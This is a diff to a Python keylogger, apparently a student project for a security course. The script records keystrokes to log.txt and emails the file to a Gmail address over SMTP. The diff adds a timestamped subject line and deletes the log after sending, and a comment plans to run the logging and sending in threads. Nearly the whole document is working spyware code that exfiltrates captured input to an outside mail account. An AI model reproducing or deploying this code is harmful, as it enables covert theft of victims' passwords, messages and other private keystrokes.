@@ -5,6 +5,9 @@ from email import encoders
 from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
 
+from datetime import datetime
+from os import remove
+
 def on_press(key):
     with open("log.txt", "a") as log:
         try:
@@ -30,10 +33,13 @@ def keylogger():
 def send_log():
 
     # Send email
+    now = datetime.now()
+    date_time = now.strftime("%d/%m/%Y, %H:%M:%S")
+
     msg = MIMEMultipart()
     msg['From'] = "scruffy.comp681.sa@gmail.com"
     msg['To'] = "scruffy.comp6841.sa@gmail.com"
-    msg['Subject'] = "log"
+    msg['Subject'] = f"log: {date_time}"
 
     filename = "log.txt"
 
@@ -52,6 +58,9 @@ def send_log():
     server.sendmail("scruffy.comp6841.sa@gmail.com", "scruffy.comp6841.sa@gmail.com", msg.as_string())
 
     # Delete log
+    remove("log.txt")
 
 send_log()
 keylogger()
+
+# Plan: Run simultaneous threads for processes
